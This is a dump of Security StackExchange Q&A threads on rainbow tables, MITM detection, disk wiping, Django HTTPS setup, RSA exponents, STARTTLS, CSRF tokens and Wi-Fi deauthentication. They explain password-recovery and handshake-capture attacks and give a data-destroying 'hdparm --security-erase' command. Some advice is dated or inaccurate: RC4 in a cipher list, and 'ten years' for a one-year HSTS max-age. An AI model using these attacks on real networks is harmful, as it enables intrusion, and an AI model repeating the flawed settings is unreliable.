<p>Your best case is to use a high-level well-vetted scheme: for communication security, use TLS (or SSL); for data at rest, use GPG (or PGP).  If you can't do that, use a high-level crypto library, like <a href=""http://www.cryptlib.com/"">cryptlib</a>, GPGME, <a href=""http://www.keyczar.org/"">Keyczar</a>, or <a href=""http://nacl.cace-project.eu/"">NaCL</a>, instead of a low-level one, like OpenSSL, CryptoAPI, JCE, etc..  Thanks to Nate Lawson for this suggestion.</p>
","2210"
"What are rainbow tables and how are they used?","49466","","<p>Where can I find one? Is there a pot of gold at the end?<br>
How do I protect against them?</p>

<hr>

<p>From the <a href=""http://area51.stackexchange.com/proposals/8431/it-security/15436#15436"">Area51 proposal</a></p>

<blockquote>
  <p>This question was <strong><a href=""https://security.meta.stackexchange.com/questions/356"">IT Security Question of the Week</a></strong>.<br/>
  Read the Sep 09, 2011 <strong><a href=""http://security.blogoverflow.com/2011/09/qotw-9-what-are-rainbow-tables-and-how-are-they-used/"" rel=""noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/questions/tagged/qotw?sort=newest"">submit your own</a></strong> Question of the Week.</p>
</blockquote>
","<p>Rainbow Tables are commonly confused with another, simpler technique that leverages a compute time-storage tradeoff in password recover: hash tables.</p>

<p>Hash tables are constructed by hashing each word in a password dictionary. The password-hash pairs are stored in a table, sorted by hash value. To use a hash table, simple take the hash and perform a binary search in the table to find the original password, if it's present.</p>

<p>Rainbow Tables are more complex. Constructing a rainbow table requires two things: a hashing function and a reduction function. The hashing function for a given set of Rainbow Tables must match the hashed password you want to recover. The reduction function must transform a hash into something usable as a password. A simple reduction function is to Base64 encode the hash, then truncate it to a certain number of characters.</p>

<p>Rainbow tables are constructed of ""chains"" of a certain length: 100,000 for example. To construct the chain, pick a random seed value. Then apply the hashing and reduction functions to this seed, and its output, and continue iterating 100,000 times. Only the seed and final value are stored. Repeat this process to create as many chains as desired.</p>

<p>To recover a password using Rainbow Tables, the password hash undergoes the above process for the same length: in this case 100,000 but each link in the chain is retained. Each link in the chain is compared with the final value of each chain. If there is a match, the chain can be reconstructed, keeping both the output of each hashing function and the output of each reduction function. That reconstructed chain will contain the hash of the password in question as well as the password that produced it.</p>

<p>The strengths of a hash table are that recovering a password is lightning fast (binary search) and the person building the hash table can choose what goes into it, such as the top 10,000 passwords. The weakness compared to Rainbow Tables is that hash tables must store every single hash-password pair.</p>

<p>Rainbow Tables have the benefit the person constructing those tables can choose how much storage is required by selecting the number of links in each chain. The more links between the seed and the final value, the more passwords are captured. One weakness is that the person building the chains doesn't choose the passwords they capture so Rainbow Tables can't be optimized for common passwords. Also, password recovery involves computing long chains of hashes, making recovery an expensive operation. The longer the chains, the more passwords are captured in them, but more time is required to find a password inside.</p>

<p>Hash tables are good for common passwords, Rainbow Tables are good for tough passwords. The best approach would be to recover as many passwords as possible using hash tables and/or conventional cracking with a dictionary of the top N passwords. For those that remain, use Rainbow Tables.</p>
","440"
"Can I detect a MITM attack?","49370","","<p>Based on this question here:
<a href=""https://security.stackexchange.com/questions/12041/are-man-in-the-middle-attacks-extremely-rare"">Are &quot;man in the middle&quot; attacks extremely rare?</a></p>

<p>Is it possible to detect man-in-the-middle attacks, and if so, how would one go about it?</p>

<p>In addition, what if the attack is taking place via connecting into the local network, such as phone lines?  Is there any way to detect it?</p>
","<p>While browsing, you can check every time if the certificate that is presented to you by the website is issued by a legitimate CA or its a fake certificate issued by some CA that your browser trusts. Obviously it is not possible do it manually. So, there are tools that do it for you.</p>

<p><a href=""https://addons.mozilla.org/en-US/firefox/addon/certificate-patrol/"" rel=""noreferrer"">Cert Patrol</a> and <a href=""http://perspectives-project.org/"" rel=""noreferrer"">Perspective</a> are browser plugins that do essentially that. They keep a note of which domainnames are issues by which CAs (eg. Google=>Thwate, etc.) and many other parameters related to the certificates and will alarm the user if either the CA changes OR if the public key in the cert changes. </p>

<p>These are obviously not detection of MITM, they are more like prevention schemes by detecting that something is odd about the certificate presented by the website.</p>

<p>Also while connecting to a SSH server, it asks for the server fingerprint. I'd be alarmed if my ssh client presents me a new fingerprint after I've previously connected to a server. The server host key gets saved to the known_hosts file after first connection, the only reason the client is asking me to validate the fingerprint again is because either the SSH server has restarted/updated OR I am being MITMed. </p>

<p>Absolute paranoia demands you to call the system admin on phone and confirm the fingerprint by <strong>making him</strong> speak the key.</p>
","12080"
"Why is writing zeros (or random data) over a hard drive multiple times better than just doing it once?","49356","","<p>Lots of different programs, such as <a href=""http://www.dban.org/"">Darik's Boot and Nuke</a>, let you write over a hard drive multiple times under the guise of it being more secure than just doing it once. Why?</p>
","<p><em>Summary: it was marginally better on older drives, but doesn't matter now. Multiple passes erase a tree with overkill but miss the rest of the forest. Use encryption.</em></p>

<p>The origin lies in work by Peter Gutmann, who showed that there is some memory in a disk bit: a zero that's been overwritten with a zero can be distinguished from a one that's been overwritten with a zero, with a probability higher than 1/2. However, Gutmann's work has been somewhat overhyped, and does not extend to modern disks. <a href=""http://web.archive.org/web/20121110053501/http://grot.com/wordpress/?p=154"">“The urban legend of multipass hard disk overwrite and DoD 5220-22-M” by Brian Smithson</a> has a good overview of the topic.</p>

<p>The article that started it is <a href=""http://www.cs.auckland.ac.nz/~pgut001/pubs/secure_del.html"">“Secure Deletion of Data from Magnetic and Solid-State Memory” by Peter Gutmann</a>, presented at USENIX in 1996. He measured data remanence after repeated wipes, and saw that after 31 passes, he was unable (with expensive equipment) to distinguish a multiply-overwritten one from a multiply-overwritten zero. Hence he proposed a 35-pass wipe as an overkill measure.</p>

<p>Note that this attack assumes an attacker with physical access to the disk and somewhat expensive equipment. It is rather unrealistic to assume that an attacker with such means will choose this method of attack rather than, say, <a href=""http://xkcd.com/538/"">lead pipe cryptography</a>.</p>

<p>Gutmann's findings do not extend to modern disk technologies, which pack data more and more. <a href=""http://www.springerlink.com/content/408263ql11460147/"">“Overwriting Hard Drive Data: The Great Wiping Controversy” by Craig Wright, Dave Kleiman and Shyaam Sundhar</a> is a recent article on the topic; they were unable to replicate Gutmann's recovery with recent drives. They also note that the probability of recovering successive bits does not have a strong correlation, meaning that an attacker is very unlikely to recover, say, a full secret key or even a byte. Overwriting with zeroes is slightly less destructive than overwriting with random data, but even a single pass with zeroes makes the probability of any useful recovery very low. <a href=""http://www.cs.auckland.ac.nz/~pgut001/pubs/secure_del.html#Epilogue"">Gutmann somewhat contests the article</a>; however, he agrees with the conclusion that his recovery techniques are not applicable to modern disks:</p>

<blockquote>
  <p>Any modern drive will most likely be a hopeless task, what with ultra-high densities and use of perpendicular recording I don't see how MFM would even get a usable image, and then the use of EPRML will mean that even if you could magically transfer some sort of image into a file, the ability to decode that to recover the original data would be quite challenging.</p>
</blockquote>

<p>Gutmann later studied <a href=""http://www.cypherpunks.to/~peter/usenix01.pdf"">flash technologies</a>, which show more remanence.</p>

<p>If you're worried about an attacker with physical possession of the disk and expensive equipment, the quality of the overwrite is not what you should worry about. Disks reallocate sectors: if a sector is detected as defective, then the disk will not make it accessible to software ever again, but the data that was stored there may be recovered by the attacker. This phenomenon is worse on SSD due to their wear leveling.       </p>

<p>Some storage media have a secure erase command (ATA Secure Erase). <a href=""http://cmrr.ucsd.edu/people/Hughes/SecureErase.shtml"">UCSD CMRR provides a DOS utility to perform this command</a>; under Linux you can use <code>hdparm --security-erase</code>. Note that this command may not have gone through extensive testing, and you will not be able to perform it if the disk died because of fried electronics, a failed motor, or crashed heads (unless you repair the damage, which would cost more than a new disk).</p>

<p>If you're concerned about an attacker getting hold of the disk, don't put any confidential data on it. Or if you do, encrypt it. Encryption is cheap and reliable (well, as reliable as your password choice and system integrity).</p>
","10474"
"Trying to make a Django-based site use HTTPS-only, not sure if it's secure?","49252","","<p>The EFF recommends <a href=""https://www.eff.org/https-everywhere/deploying-https"" rel=""nofollow noreferrer"">using HTTPS everywhere</a> on your site, and I'm sure this site would agree. When I asked a question about using Django to implement HTTPS on my login page, that was certainly <a href=""https://stackoverflow.com/questions/8153875/how-to-deploy-an-https-only-site-with-django-nginx"">the response I got</a> :)</p>

<p>So I'm trying to do just that. I have a Django/nginx setup that I'm trying to configure for HTTPS-only - it's sort of working, but there are problems. More importantly, I'm sure if it's really <em>secure</em>, despite seeing the <em>https</em> prefix.</p>

<p>I have configured nginx to redirect all http pages to https, and that part works. However... Say I have a page, <code>https://mysite.com/search/</code>, with a search form/button on it. I click the button, Django processes the form, and does a redirect to a <em>results</em> page, which is <code>http://mysite.com/search/results?term=""foo""</code>.</p>

<p>This URL gets sent to the browser, which sends it <em>back</em> to the nginx server, which does a permanent redirect to an <code>https</code>-prefixed version of the page. (At least I <em>think</em> that's what is happening - certainly IE warns me that I'm going to an insecure page, and then right back to a secure page :)</p>

<p>But is this <em>really</em> secure? Or, at least as much security as a standard HTTPS-only site would have? Is the fact that Django transmits a http-prefix URL, someone compromising security? Yes, as far as I can tell, only pages that have an https-prefix get replied to, but it just doesn't <em>feel</em> right :) Security is funky, as this site can attest to, and I'm worried there's something I'm missing.</p>
","<h3>Secure your cookies</h3>

<p>In <a href=""https://docs.djangoproject.com/en/dev/topics/http/sessions/#session-cookie-secure"" rel=""nofollow noreferrer"">settings.py</a> put the lines</p>

<pre><code>SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
</code></pre>

<p>and cookies will only be sent via HTTPS connections.   Additionally, you probably also want <code>SESSION_EXPIRE_AT_BROWSER_CLOSE=True</code>.  Note if you are using older versions of django (less than 1.4), there isn't a setting for secure CSRF cookies.  As a quick fix, you can just have CSRF cookie be secure when the session cookie is secure (<code>SESSION_COOKIE_SECURE=True</code>), by editing  <code>django/middleware/csrf.py</code>:</p>

<pre><code>class CsrfViewMiddleware(object):
   ...
   def process_response(self, request, response):
       ...
       response.set_cookie(settings.CSRF_COOKIE_NAME,
            request.META[""CSRF_COOKIE""], max_age = 60 * 60 * 24 * 7 * 52,
            domain=settings.CSRF_COOKIE_DOMAIN,
            secure=settings.SESSION_COOKIE_SECURE or None)
</code></pre>

<h3>Direct HTTP requests to HTTPS in the webserver</h3>

<p>Next you want a rewrite rule that redirects http requests to https, e.g., in nginx</p>

<pre><code>server {
   listen 80;
   rewrite ^(.*) https://$host$1 permanent;
}
</code></pre>

<p>Django's <code>reverse</code> function and url template tags only return relative links; so if you are on an https page your links will keep you on the https site.</p>

<h3>Set OS environmental variable HTTPS to on</h3>

<p>Finally, (and my original response excluded this), you need to enable the OS environmental variable <code>HTTPS</code> to <code>'on'</code> so django will prepend https to fully generated links (e.g., like with <code>HttpRedirectRequest</code>s).  If you are using mod_wsgi, you can add the line:</p>

<pre><code>os.environ['HTTPS'] = ""on""
</code></pre>

<p>to your <a href=""http://code.google.com/p/modwsgi/wiki/IntegrationWithDjango"" rel=""nofollow noreferrer"">wsgi script</a>.  If you are using uwsgi, you can add an environmental variable by the command line switch <code>--env HTTPS=on</code> or by adding the line <code>env = HTTPS=on</code> to your uwsgi <code>.ini</code> file.  As a last resort if nothing else works, you could edit your settings file to have the lines <code>import os</code> and <code>os.environ['HTTPS'] = ""on""</code>, which also should work.</p>

<p>If you are using wsgi, you may want to additionally set the environmental variable <code>wsgi.url_scheme</code> to <code>'https'</code> by adding this to your <code>settings.py</code> :</p>

<pre><code>os.environ['wsgi.url_scheme'] = 'https'
</code></pre>

<p>The wsgi advice courtesy of <a href=""https://security.stackexchange.com/questions/8964/trying-to-make-a-django-based-site-use-https-only-not-sure-if-its-secure/8970#comment80472_8970"">Vijayendra Bapte's comment</a>.</p>

<p>You can see the need for this environmental variable by reading <code>django/http/__init__.py</code>:</p>

<pre><code>def build_absolute_uri(self, location=None):
    """"""
    Builds an absolute URI from the location and the variables available in
    this request. If no location is specified, the absolute URI is built on
    ``request.get_full_path()``.
    """"""
    if not location:
        location = self.get_full_path()
    if not absolute_http_url_re.match(location):
        current_uri = '%s://%s%s' % (self.is_secure() and 'https' or 'http',
                                     self.get_host(), self.path)
        location = urljoin(current_uri, location)
    return iri_to_uri(location)

def is_secure(self):
    return os.environ.get(""HTTPS"") == ""on""
</code></pre>

<h3>Additional Web Server Things:</h3>

<p>Take <a href=""https://security.stackexchange.com/a/38932/2568"">that guy's advice</a> and turn on HSTS headers in your web server by adding a line to nginx:</p>

<pre><code>add_header Strict-Transport-Security max-age=31536000;
</code></pre>

<p>This tells your web browser that your website for the next 10 years will be using HTTPS only.  If there's any Man-in-the-middle attack on any future visit from the same browser (e.g., you log on to a malicious router in a coffee-shop that redirects you to an HTTP version of the page), your browser will remember it is supposed to be HTTPS only and prevent you from inadvertently giving up your information.  But be careful about this, you can't change your mind and later decide part of your domain will be served over HTTP (until the 10 years have passed from when you removed this line).  So plan ahead; e.g., if you believe your application may soon grow in popularity and you'll need to be on a big CDN that doesn't handle HTTPS well at a price you can afford, you may have an issue.</p>

<p>Also make sure you disable weak protocols.  Submit your domain to an <a href=""https://www.ssllabs.com/ssltest/"" rel=""nofollow noreferrer"">SSL Test</a> to check for potential problems (too short key, not using TLSv1.2, using broken protocols, etc.).  E.g., in nginx I use:</p>

<pre><code>ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_prefer_server_ciphers on;
ssl_ciphers ""EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS"";
</code></pre>
","8970"
"Should RSA public exponent be only in {3, 5, 17, 257 or 65537} due to security considerations?","49188","","<p>In my project I'm using the value of public exponent of 4451h. I thought it's safe and ok until I started to use one commercial RSA encryption library. If I use this exponent with this library, it throws exception.</p>

<p>I contacted developers of this library and got the following reply: ""This feature is to prevent some attacks on RSA keys. The consequence is that the exponent value is limited to {3, 5, 17, 257 or 65537}. Deactivating this check is still being investigated, as the risks may be great.""</p>

<p>It's the first time in my life I hear that values other than {3, 5, 17, 257 or 65537} are used to break RSA. I knew only of using 3 with improper padding being vulnerable.</p>

<p>Is that really so? Surely, I can use another library, but after such answer I worried about security of my solution.</p>
","<p>There is no known weakness for any short or long public exponent for RSA, as long as the public exponent is ""correct"" (i.e. relatively prime to <em>p-1</em> for all primes <em>p</em> which divide the modulus).</p>

<p><em>If</em> you use a small exponent <em>and</em> you do not use any padding for encryption <em>and</em> you encrypt the exact same message with several distinct public keys, then your message is at risk: if <em>e = 3</em>, and you encrypt message <em>m</em> with public keys <em>n<sub>1</sub></em>, <em>n<sub>2</sub></em> and <em>n<sub>3</sub></em>, then you have <em>c<sub>i</sub> = m<sup>3</sup></em> mod <em>n<sub>i</sub></em> for <em>i = 1</em> to <em>3</em>. By the <a href=""http://en.wikipedia.org/wiki/Chinese_remainder_theorem"">Chinese Remainder Theorem</a>, you can then rebuild <em>m<sup>3</sup></em> mod <em>n<sub>1</sub>n<sub>2</sub>n<sub>3</sub></em>, which turns out to be <em>m<sup>3</sup></em> (without any modulo) because 
<em>n<sub>1</sub>n<sub>2</sub>n<sub>3</sub></em> is a greater integer. A (non modular) cube root extraction then suffices to extract <em>m</em>.</p>

<p>The weakness, here, is <strong>not</strong> the small exponent; rather, it is the use of an improper padding (namely, no padding at all) for encryption. Padding is very important for security of RSA, whether encryption or signature; if you do not use a proper padding (such as the ones described in <a href=""http://www.rsa.com/rsalabs/node.asp?id=2125"">PKCS#1</a>), then you have many weaknesses, and the one outlined in the paragraph above is not the biggest, by far. Nevertheless, whenever someone refers to an exponent-size related weakness, he more or less directly refers to this occurrence. That's a bit of old and incorrect lore, which is sometimes inverted into a prohibition against <em>big</em> exponents (since it is a myth, the reverse myth is also a myth and is no more -- and no less -- substantiated); I believe this is what you observe here.</p>

<p>However, one can find a few reasons why a big public exponent shall be avoided:</p>

<ul>
<li><p>Small public exponents promote efficiency (for public-key operations).</p></li>
<li><p>There are security issues about having a small <em>private</em> exponent; a key-recovery attack has been described when the private exponent length is no more than 29% of the public exponent length. When you want to force the private exponent to be short (e.g. to speed up private key operations), you more or less have to use a big public exponent (as big as the modulus); requiring the public exponent to be short may then be viewed as a kind of indirect countermeasure.</p></li>
<li><p>Some widely deployed RSA implementations choke on big RSA public exponents. E.g. the RSA code in Windows (CryptoAPI, used by Internet Explorer for HTTPS) insists on encoding the public exponent within a single 32-bit word; it cannot process a public key with a bigger public exponent.</p></li>
</ul>

<p>Still, ""risks may be great"" looks like the generic justification (""this is a security issue"" is the usual way of saying ""we did not implement it but we do not want to admit any kind of laziness"").</p>
","2339"
"Test STARTTLS configuration of SMTP server","49133","","<p>Is there an easy way to test an SMTP server to check for configuration issues associated with STARTTLS encryption, and report on whether it has been configured properly so that email will be encrypted using STARTTLS?</p>

<p>Think of the <a href=""https://www.ssllabs.com/ssltest/"" rel=""noreferrer"">Qualys SSL server tester</a> as an analogy: it is a great tool to quickly check a webserver to see use of SSL has been properly configured, and identify opportunities for improving the configuration to provide stronger encryption.  It knows how to recognize many common configuration errors and gives a grade.  Is there anything like that for STARTTLS on SMTP servers?</p>

<p>In particular, given a SMTP server, I would like to tell:</p>

<ol>
<li>whether it supports STARTTLS,</li>
<li>whether its STARTTLS configuration has been set up properly so that email with other major email providers will end up being encrypted, </li>
<li>whether it supports perfect forward secrecy and whether it is configured so that the perfect forward secrecy ciphersuites will be used in practice (where possible), </li>
<li>whether it provides a suitable certificate that will pass strict validation checks, </li>
<li>whether it has any other configuration errors.  </li>
</ol>

<p>How can I do this?</p>

<p><a href=""https://www.facebook.com/notes/protect-the-graph/the-current-state-of-smtp-starttls-deployment/1453015901605223"" rel=""noreferrer"">Facebook</a> and <a href=""https://www.google.com/transparencyreport/saferemail/?hl=en"" rel=""noreferrer"">Google</a> have recently highlighted the state of STARTTLS usage on the Internet and called for server operators to enable STARTTLS and configure it appropriately so that email will be encrypted while in transit.  Are there easy-to-use tools to support this goal?</p>
","<p>Here are a several websites that provide tests that you may be interested in.</p>

<ul>
<li><p><strong>SSL-Tools</strong> is a web-based tool that tests a SMTP server for each of the items you mentioned; it tests for STARTTLS support, a certificate that passes strict validation checks, support for perfect forward secrecy, and other stuff:</p>

<p><a href=""https://ssl-tools.net/mailservers"" rel=""noreferrer"">https://ssl-tools.net/mailservers</a></p></li>
<li><p><strong>StartTLS</strong> is a web-based tool that tests a SMTP server and provides a simple grade, along with many details on the configuration of the SMTP server (though no testing of whether perfect forward secrecy is used):</p>

<p><a href=""https://starttls.info/"" rel=""noreferrer"">https://starttls.info/</a> (see <a href=""https://starttls.info/about"" rel=""noreferrer"">the about page</a> information about the service, or <a href=""https://starttls.info/stats"" rel=""noreferrer"">statistics</a> about sites checked with their service)</p></li>
<li><p><strong>CheckTLS</strong> is a web-based tool provide a way to test a SMTP server for STARTTLS server as well as whether the certificate is ""ok"" (i.e., it passes strict validation) and partial information on what cipher was negotiated when they connected to that SMTP server (but no information about perfect forward secrecy support):</p>

<p><a href=""https://www.checktls.com/"" rel=""noreferrer"">https://www.checktls.com/</a></p></li>
<li><p>The following web-based tools check whether a SMTP server support STARTTLS, but do not perform any of the other checks mentioned in the question:</p>

<ul>
<li><a href=""https://luxsci.com/extranet/tlschecker.html"" rel=""noreferrer"">https://luxsci.com/extranet/tlschecker.html</a> (see <a href=""http://luxsci.com/blog/how-to-tell-who-supports-tls-for-email-transmission.html"" rel=""noreferrer"">http://luxsci.com/blog/how-to-tell-who-supports-tls-for-email-transmission.html</a> for introduction)</li>
<li><a href=""https://mxtoolbox.com/"" rel=""noreferrer"">https://mxtoolbox.com/</a></li>
</ul></li>
</ul>

<p>If you have to check only one or two, try SSL-Tools and StartTLS.</p>
","59145"
"Securing a JavaScript Single Page App with RESTful backend","49132","","<p>I'm currently in the process of building a JavaScript SPA and have been researching how to secure it.  There is currently as RESTful API that is being completely interacted with through AJAX. We also have mobile clients that interact with this API, and currently it only supports HTTP BASIC Authentication over SSL.  The JavaScript app will also communicate exclusively over SSL, but BASIC Auth won't cut it as that would involve storing the password (or a derivative of it) on the client.  Lastly, the SPA app will be pure JavaScript and HTML, served on the same server as the RESTful API, but without any server-side framework.</p>

<p><strong>Goals</strong>:</p>

<ul>
<li>No server-side framework for the javascript client (it's just another client).</li>
<li>Maintain statelessness of the RESTful API, for the typical reasons (scalability, fault tolerance, simplified deployment, etc)</li>
<li>Any state should be maintained by the client. For the purposes of this question, this means the login credentials.</li>
<li>Login state maintained by the client must be secure and be resistant to session hijacking and similar attacks.</li>
</ul>

<p>What I've come up with is based on my research of OAuth and similar schemes (Amazon, etc). </p>

<ol>
<li>The user will login using and HTTP POST over SSL.</li>
<li><p>The server will compute a hash as follows:</p>

<p>HMAC(key, userId + "":"" + ipAddress + "":"" + userAgent + "":"" + todaysDateInMilliseconds)</p></li>
<li><p>This token will be returned to the client and supplied with every subsequent request in place of the userName and password.  It will most likely be stored in localStorage or a cookie.</p></li>
</ol>

<p>Is this secure?  My motivation for choosing the userId,ipAddress,todaysDateInMilleseconds is to create a token that is valid for only today, but does not require database lookup for every request AND is safe to be stored on the client.  I cannot trust that the key will not be comprimised, thus the inclusion of IP Address in an attempt to prevent session hijacking. </p>

<p>Let me include the following link from a related post on StackExchange because I think it addresses a lot of the issues I'm trying to solve: <a href=""http://appsandsecurity.blogspot.com/2011/04/rest-and-stateless-session-ids.html"">REST and Stateless Session Ids</a></p>

<p>After the initial feedback here I've decided to use only the first two octects of the IP address to handle clients behind proxies and mobile clients better. It's still not perfect, but its a tradeoff for some additional security.</p>
","<p>The service offered by the token is that the server will somehow recognize the token as one of its own. How can the server validate a HMAC-based token ? By recomputing it, using its secret HAMC key and <em>the data over which HMAC operates</em>. If you want your token to be computed over the userID, password, IP and date, then the server must know all that information. However, you do not want your server to store the password, and the client will not send it back with each request. How can your system work, then ?</p>

<p>The basic idea, however, is sound:</p>

<ul>
<li>Users ""logs in"" by any way which you see fit.</li>
<li>Upon such login, the server sends a cookie value, to be sent back with each subsequent request (that's what cookies do).</li>
<li>The cookie contains the user ID, the date it was issued, and a value <em>m = HMAC(K, userID || date || IP)</em>.</li>
<li>When the server receives a request, it validates the cookie: the userID and date are from the cookie itself, the source IP is obtained from the Web server layer, and the server can recompute the value <em>m</em> to check that it matches the one stored in the cookie.</li>
</ul>

<p>You could replace the whole cookie with a random session ID, if the server has some (temporary) storage space. Indeed, the server could <em>remember</em> the mapping from a random session ID to the user-specific information (such as his name and IP address); old session ID can be automatically expired, so the storage space does not grow indefinitely. The cookie described above is just a way to <strong>offload storage</strong> on the client itself.</p>

<p><strong>Note:</strong> using the IP address may imply some practical issues. Some clients are behind proxies, even load-balanced proxies, so not only is the client IP address possibly ""hidden"" (from the server, you see the proxy's address, not the client's address) but the IP address you obtain server-side could move around erratically (if two successive requests from the client have gone through distinct proxies in a proxy farm).</p>
","19622"
"Preventing deauthentication attacks","48899","","<p>I am helpless against some kiddy with backtrack who repeatedly uses aireplay-ng to deauthenticate legitimate users on my Wifi work network.</p>

<p>I captured and analyzed the network traffic on my Wifi work network, and I noticed a remarkable amount of 802.11 deauth packets. I realize it may not be possible to catch him, or even know where the attack came from.  I just want to know: Is there any way to prevent such an attack?</p>
","<p>Realistically, you cannot stop a bad guy from sending deauthentication packets.</p>

<p>Instead, you should focus on ensuring you are resilient to a deauth attack.  Make sure your network is configured in a way that the deauth attack doesn't enable an attacker to compromise your network.</p>

<p>To do that, you need to make sure you are using WPA2.  If you are using a pre-shared key (a passphrase), make sure the passphrase is very long and strong.  If it is not already, change it immediately!  If you are not using WPA2, fix that immediately!</p>

<p>The primary reason why bad guys send deauth packets is that this helps them execute a dictionary attack against your passphrase.  If a bad guy captures a copy of the initial handshake, they can try out various guesses at your passphrase and test whether they are correct.  Sending a deauth packet forces the targeted device to disconnect and reconnect, allowing an eavesdropper to capture a copy of the initial handshake.  Therefore, standard practice of many attackers who might try to attack your wireless network is to send deauth packets.  If you are seeing many deauth packets, that is a sign that someone may be trying to attack your wireless network and guess your passphrase.</p>

<p>Once the attacker has sent a deauth packet and intercepted the initial handshake, there are tools and online services that automate the task of trying to recover the passphrase, by guessing many possibilities.  (See, e.g., <a href=""https://www.wpacracker.com/"" rel=""nofollow noreferrer"">CloudCracker</a> for a representative example.)</p>

<p>The defense against this kind of attack is to ensure your passphrase is so long and strong that it cannot possibly be guessed.  If it's not already long and strong, you need to change it right away, because someone is probably trying to guess it as we speak.</p>

<p>(The other reason a bad guy might send deauth packets is as an annoyance.  However, as most users probably won't even notice, it's not a very effective annoyance.)</p>

<p>To learn more, see these resources:</p>

<ul>
<li><p><a href=""https://security.stackexchange.com/q/12401/971"">How does deauthing work in aireplay-ng?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/16317/971"">Can someone get my WPA2 password with honeypots?</a></p></li>
</ul>
","20226"
"Why refresh CSRF token per form request?","48813","","<p>In many tutorials and guides I see that a CSRF token should be refreshed per request. My question is why do I have to do this? Isn't a single CSRF token per session much easier than generating one per request and keeping track of the ones requested?</p>

<p>Generating the token on a per-request basis doesn't seem to improve security beyond what a per-session token would already do. The only argument seems to be XSS protection, but this doesn't apply as when you have a XSS vulnerability the script could read out new tokens anyway.</p>

<p>What are the benefits of generating new tokens per request?</p>
","<p>For the reasons already discussed, it is not necessary to generate a new token per request. It brings almost zero security advantage, and it costs you in terms of usability: with only one token valid at once, the user will not be able to navigate the webapp normally. For example if they hit the 'back' button and submit the form with new values, the submission will fail, and likely greet them with some hostile error message. If they try to open a resource in a second tab, they'll find the session randomly breaks in one or both tabs. It is usually not worth maiming your application's usability to satisfy this pointless requirement.</p>

<p>There <em>is</em> one place where it is worth issuing a new CSRF token, though: on principal-change inside a session. That is, primarily, at login. This is to prevent a session fixation attack leading to a CSRF attack possibility.</p>

<p>For example: attacker accesses the site and generates a new session. They take the session ID and inject it into a victim's browser (eg via writing cookie from a vulnerable neighbour domain, or using another vulnerability like jsessionid URLs), and also inject the CSRF token into a form in the victim's browser. They wait for the victim to log in with that form, and then use another form post to get the victim to perform an action with the still-live CSRF token.</p>

<p>To prevent this, invalidate the CSRF token and issue a new one in the places (like login) that you're already doing the same to the session ID to prevent session fixation attacks.</p>
","22936"
"How is it possible that people observing an HTTPS connection being established wouldn't know how to decrypt it?","48792","","<p>I've often heard it said that if you're logging in to a website - a bank, GMail, whatever - via HTTPS, that the information you transmit is safe from snooping by 3rd parties. I've always been a little confused as to how this could be possible. </p>

<p>Sure, I understand fairly well (I think) the idea of encryption, and that without knowing the encryption key people would have a hard time breaking the encryption. However, my understanding is that when an HTTPS connection is established, the encryption key is ""discussed"" between the various computers involved before the encrypted connection is established. There may be many factors involved in choosing an encryption key, and I know it has to do with an SSL certificate which may come from some other server. I do not know the exact mechanism.</p>

<p>However, it seems to me that if the encryption key must be negotiated between the server and the client before the encryption process can begin, then any attacker with access to the network traffic would also be able to monitor the negotiation for the key, and would therefore know the key used to establish the encryption. This would make the encryption useless if it were true.</p>

<p>It's obvious that this isn't the case, because HTTPS would have no value if it were, and it's widely accepted that HTTPS is a fairly effective security measure. However, I don't get <i>why</i> it isn't true. In short: <b>how is it possible for a client and server to establish an encrypted connection over HTTPS without revealing the encryption key to any observers?</b></p>
","<p>It is the magic of <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography"">public-key cryptography</a>. Mathematics are involved.</p>

<p>The asymmetric key exchange scheme which is easiest to understand is asymmetric encryption with RSA. Here is an oversimplified description:</p>

<p>Let <em>n</em> be a big integer (say 300 digits); <em>n</em> is chosen such that it is a product of two prime numbers of similar sizes (let's call them <em>p</em> and <em>q</em>). We will then compute things ""modulo <em>n</em>"": this means that whenever we add or multiply together two integers, we divide the result by <em>n</em> and we keep the remainder (which is between <em>0</em> and <em>n-1</em>, necessarily).</p>

<p>Given <em>x</em>, computing <em>x<sup>3</sup></em> modulo <em>n</em> is easy: you multiply <em>x</em> with <em>x</em> and then again with <em>x</em>, and then you divide by <em>n</em> and keep the remainder. Everybody can do that. On the other hand, given <em>x<sup>3</sup></em> modulo <em>n</em>, recovering <em>x</em> seems overly difficult (the best known methods being far too expensive for existing technology) -- <em>unless</em> you know <em>p</em> and <em>q</em>, in which case it becomes easy again. But computing <em>p</em> and <em>q</em> from <em>n</em> seems hard, too (it is the problem known as <a href=""http://en.wikipedia.org/wiki/Integer_factorization"">integer factorization</a>).</p>

<p>So here is what the server and client do:</p>

<ul>
<li>The server has a <em>n</em> and knows the corresponding <em>p</em> and <em>q</em> (it generated them). The server sends <em>n</em> to the client.</li>
<li>The client chooses a random <em>x</em> and computes <em>x<sup>3</sup></em> modulo <em>n</em>.</li>
<li>The client sends <em>x<sup>3</sup></em> modulo <em>n</em> to the server.</li>
<li>The server uses its knowledge of <em>p</em> and <em>q</em> to recover <em>x</em>.</li>
</ul>

<p>At that point, both client and server know <em>x</em>. But an eavesdropper saw only <em>n</em> and <em>x<sup>3</sup></em> modulo <em>n</em>; he cannot recompute <em>p</em>, <em>q</em> and/or <em>x</em> from that information. So <em>x</em> is a <strong>shared secret</strong> between the client and the server. After that this is pretty straightforward symmetric encryption, using <em>x</em> as key.</p>

<p>The <em>certificate</em> is a vessel for the server public key (<em>n</em>). It is used to thwart <em>active</em> attackers who would want to impersonate the server: such an attacker intercepts the communication and sends <em>its</em> value <em>n</em> instead of the server's <em>n</em>. The certificate is <a href=""http://en.wikipedia.org/wiki/Digital_signature"">signed</a> by a certification authority, so that the client may know that a given <em>n</em> is really the genuine <em>n</em> from the server he wants to talk with. Digital signatures also use asymmetric cryptography, although in a distinct way (for instance, there is also a variant of RSA for digital signatures).</p>
","6296"
